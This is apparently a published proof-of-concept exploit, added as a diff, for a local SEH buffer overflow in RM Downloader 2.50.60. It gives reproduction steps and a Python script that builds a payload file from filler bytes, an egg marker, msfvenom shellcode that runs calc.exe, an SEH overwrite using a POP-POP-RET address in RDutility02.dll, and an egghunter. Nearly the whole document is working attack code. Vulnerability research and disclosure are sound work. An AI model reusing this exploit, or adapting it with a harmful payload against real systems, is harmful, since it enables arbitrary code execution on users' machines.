@@ -1,0 +1,76 @@
+# Exploit Title: RM Downloader 2.50.60 2006.06.23 - 'Load' Local Buffer Overflow (EggHunter) (SEH) (PoC) 
+# Exploit Author: Paras Bhatia
+# Discovery Date: 2020-06-29
+# Vulnerable Software: RM Downloader
+# Software Link Download: https://github.com/x00x00x00x00/RMDownloader_2.50.60/raw/master/RMDownloader.exe
+# Version: 2.50.60 2006.06.23
+# Vulnerability Type: Local Buffer Overflow
+# Tested on: Windows 7 Ultimate Service Pack 1 (32 bit - English)  
+
+# Proof of Concept:
+
+#   1.- Run the python script, it will create a new file "RM_LCE.txt"
+#   2.- Copy the content of the new file 'RM_LCE.txt' to clipboard
+#   3.- Turn off DEP for RMDownloader.exe
+#   4.- Open 'RMDownloader.exe'
+#   5.- Go to 'Load' tab
+#   6.- Paste clipboard in 'Load' parameter
+#   7.- Click on button 'OK'
+#   8.- Two messageboxes will pop up, click OK
+#   9.- Calc.exe runs.
+
+#################################################################################################################################################
+
+#Python "RM_LCE.py" Code:
+
+f= open("RM_LCE.txt", "w")
+
+junk="\x41" * 336
+
+
+egg = "w00tw00t"
+
+# msfvenom -p windows/exec cmd=calc.exe --platform windows -f py  -b "\x0a\x0d\x00"
+
+buf =  ""
+buf += "\xd9\xeb\xb8\xfa\x38\xad\x4f\xd9\x74\x24\xf4\x5a\x29"
+buf += "\xc9\xb1\x31\x83\xc2\x04\x31\x42\x14\x03\x42\xee\xda"
+buf += "\x58\xb3\xe6\x99\xa3\x4c\xf6\xfd\x2a\xa9\xc7\x3d\x48"
+buf += "\xb9\x77\x8e\x1a\xef\x7b\x65\x4e\x04\x08\x0b\x47\x2b"
+buf += "\xb9\xa6\xb1\x02\x3a\x9a\x82\x05\xb8\xe1\xd6\xe5\x81"
+buf += "\x29\x2b\xe7\xc6\x54\xc6\xb5\x9f\x13\x75\x2a\x94\x6e"
+buf += "\x46\xc1\xe6\x7f\xce\x36\xbe\x7e\xff\xe8\xb5\xd8\xdf"
+buf += "\x0b\x1a\x51\x56\x14\x7f\x5c\x20\xaf\x4b\x2a\xb3\x79"
+buf += "\x82\xd3\x18\x44\x2b\x26\x60\x80\x8b\xd9\x17\xf8\xe8"
+buf += "\x64\x20\x3f\x93\xb2\xa5\xa4\x33\x30\x1d\x01\xc2\x95"
+buf += "\xf8\xc2\xc8\x52\x8e\x8d\xcc\x65\x43\xa6\xe8\xee\x62"
+buf += "\x69\x79\xb4\x40\xad\x22\x6e\xe8\xf4\x8e\xc1\x15\xe6"
+buf += "\x71\xbd\xb3\x6c\x9f\xaa\xc9\x2e\xf5\x2d\x5f\x55\xbb"
+buf += "\x2e\x5f\x56\xeb\x46\x6e\xdd\x64\x10\x6f\x34\xc1\xee"
+buf += "\x25\x15\x63\x67\xe0\xcf\x36\xea\x13\x3a\x74\x13\x90"
+buf += "\xcf\x04\xe0\x88\xa5\x01\xac\x0e\x55\x7b\xbd\xfa\x59"
+buf += "\x28\xbe\x2e\x3a\xaf\x2c\xb2\x93\x4a\xd5\x51\xec"
+
+
+nseh ="\xeb\x06\x90\x90"
+
+#1002C531   5B               POP EBX
+#1002C532   58               POP EAX
+#1002C533   C3               RETN
+#C:\Program Files\RM Downloader\RDutility02.dll
+
+
+seh="\x31\xc5\x02\x10"
+
+nops="\x90" * 20
+
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
+egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+
+
+
+payload = junk + egg + buf + nseh + seh + nops + egghunter 
+
+f.write(payload)
+f.close
